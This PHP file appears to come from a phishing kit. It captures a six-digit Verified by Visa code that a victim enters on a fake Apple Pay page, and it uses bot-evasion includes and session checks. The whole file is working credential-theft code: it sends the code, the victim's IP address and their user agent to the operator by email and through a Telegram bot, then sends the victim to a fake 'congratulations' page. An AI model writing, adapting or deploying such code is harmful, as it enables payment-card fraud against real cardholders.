<?php

include ('../../antibots/sub_sub_includes.php');
include ('../../config.php');
include ('../funcs.php');

checkSession();

    if (!empty($_POST['vbv']))
    {
        $vbv = $_POST['vbv'];

        $length = strlen($vbv);

        if ($length != 6)
        {
            exit(header("Location: ../../steps/apple_pay/index.php?error"));
        }
        else
        {

            if ($rez_mail)
            {

                $message = "
            
「 🤖 +1 VBV 🤖 」

「🤖」Code : $vbv

Adresse IP : " . $_SESSION['ip'] . "
User Agent : " . $_SESSION['agent_user'] . "
                
                ";

                $subject = " [⌨️] + 1 VBV • $vbv • " . $_SESSION['ip'];
                $headers = "From: $sender_from <$sender_mail@astridnelsia.fr>";
                mail($rezmail, $subject, $message, $headers);

            }

            if ($rez_tlg)
            {
                $message = "
                
「 🤖 +1 VBV 🤖 」

「🤖」Code : $vbv

Adresse IP : " . $_SESSION['ip'] . "
User Agent : " . $_SESSION['agent_user'] . "
                
                ";

                file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$card_chatid&text=" . urlencode($message));
            }

            header('location: ../../steps/congratulations/index.php');

        }

    }
    else
    {
        header('location: ../../steps/apple_pay/index.php?invalid');
    }

?>